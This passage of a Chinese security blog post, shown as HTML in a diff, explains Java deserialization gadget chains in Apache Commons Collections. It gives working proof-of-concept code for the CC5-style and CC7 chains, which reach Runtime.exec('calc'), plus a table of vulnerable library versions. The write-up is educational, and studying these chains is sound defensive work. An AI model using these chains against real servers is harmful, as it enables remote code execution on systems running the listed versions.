class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">null</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;, <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">    &#125;;</span><br><span class="line">    ChainedTransformer chainedTransformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">    HashMap&lt;Object, Object&gt; lzMap = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    Map map = LazyMap.lazyMap(lzMap, <span class="keyword">new</span> ConstantTransformer(<span class="string">&quot;&quot;</span>));</span><br><span class="line">    TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(map, <span class="string">&quot;1&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//注意构造函数</span></span><br><span class="line">    BadAttributeValueExpException bve = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">    <span class="comment">//因为构造函数无法赋值 所以得用反射赋值</span></span><br><span class="line">    Field valField = bve.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">    valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    valField.set(bve,tiedMapEntry);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//重设LazyMap的factory值</span></span><br><span class="line">    Field factoryField = LazyMap.class.getDeclaredField(<span class="string">&quot;factory&quot;</span>);</span><br><span class="line">    factoryField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    factoryField.set(map,chainedTransformer);</span><br><span class="line"></span><br><span class="line">    MySerUtils.writeObject(bve);</span><br><span class="line">    MySerUtils.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="9）CC7链"><a href="#9）CC7链" class="headerlink" title="9）CC7链"></a>9）CC7链</h2><img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220115001946006.png" class="">
+
+<p>因为此链的构成需要对hashtable源码有了解，我太菜了，所以无法深入研究，这里贴了一个能够正常触发的代码。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">    <span class="comment">//构造核心利用代码</span></span><br><span class="line">    Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(<span class="keyword">new</span> Transformer[<span class="number">0</span>]);</span><br><span class="line">    Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line">                               <span class="keyword">new</span> Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                               <span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                               <span class="keyword">new</span> Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                               <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">        <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                               <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                               <span class="keyword">new</span> String[]&#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        <span class="keyword">new</span> ConstantTransformer(<span class="number">1</span>)&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用Hashtable来构造利用链调用LazyMap</span></span><br><span class="line">    Map hashMap1 = <span class="keyword">new</span> HashMap();</span><br><span class="line">    Map hashMap2 = <span class="keyword">new</span> HashMap();</span><br><span class="line">    Map lazyMap1 = LazyMap.lazyMap(hashMap1, transformerChain);</span><br><span class="line">    lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    Map lazyMap2 = LazyMap.lazyMap(hashMap2, transformerChain);</span><br><span class="line">    lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line">    Hashtable hashtable = <span class="keyword">new</span> Hashtable();</span><br><span class="line">    hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">    hashtable.put(lazyMap2, <span class="number">1</span>);</span><br><span class="line">    lazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line">    <span class="comment">//输出两个元素的hash值</span></span><br><span class="line">    System.out.println(<span class="string">&quot;lazyMap1 hashcode:&quot;</span> + lazyMap1.hashCode());</span><br><span class="line">    System.out.println(<span class="string">&quot;lazyMap2 hashcode:&quot;</span> + lazyMap2.hashCode());</span><br><span class="line"></span><br><span class="line">    <span class="comment">//iTransformers = transformers（反射）</span></span><br><span class="line">    Field iTransformers = ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">    iTransformers.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    iTransformers.set(transformerChain, transformers);</span><br><span class="line"></span><br><span class="line">    MySerUtils.writeObject(hashtable);</span><br><span class="line">    MySerUtils.readObject();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>整链的调用：</p>
+<img src="/2022/01/15/web%E5%AE%89%E5%85%A8/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/CC%E9%93%BE/image-20220115004145834.png" class="">
+
+<h2 id="10）总结"><a href="#10）总结" class="headerlink" title="10）总结"></a>10）总结</h2><ul>
+<li>通过对应链的观察发现，可以相互之间组合，造成对应的机制绕过</li>
+<li>几条重要的链：<ul>
+<li>CC2：没有使用数组，可以使用类加载以及任意方法调用方式</li>
+<li>CC6：没有JDK的版本限制，也可以使用类加载以及任意方法调用方式</li>
+</ul>
+</li>
+<li>受JDK版本限制的链：<ul>
+<li>CC1和CC3，都需要利用AnnotationInvocationHandler</li>
+</ul>
+</li>
+</ul>
+<blockquote>
+<p>对应链的可利用版本：</p>
+</blockquote>
+<table>
+<thead>
+<tr>
+<th align="center">链名</th>
+<th align="center">版本</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">CommonsCollections1</td>
+<td align="center">&lt;=3.2.1</td>
+</tr>
+<tr>
+<td align="center">CommonsCollections2</td>
+<td align="center">4.0</td>
+</tr>
+<tr>
+<td align="center">CommonsCollections3</td>
+<td align="center">&lt;=3.2.1</td>
+</tr>
+<tr>
+<td align="center">CommonsCollections4</td>
+<td align="center">4.0</td>
+</tr>
+<tr>
+<td align="center">CommonsCollections5</td>
+<td align="center">&lt;=3.2.1</td>
+</tr>
+<tr>
+<td align="center">CommonsCollections6</td>
+<td align="center">&lt;=3.2.1</td>
+</tr>
+<tr>
+<td align="center">CommonsCollections7</td>
+<td align="center">&lt;=3.2.1</td>
+</tr>
+</tbody></table>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># java反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/10/14/web%E5%AE%89%E5%85%A8/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/%E7%BB%95%E8%BF%87waf%E4%B8%8A%E4%BC%A0/" rel="prev" title="绕过waf上传">
+                  <i class="fa fa-chevron-left"></i> 绕过waf上传
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">xf</span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="https://cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+
+</body>
+</html>
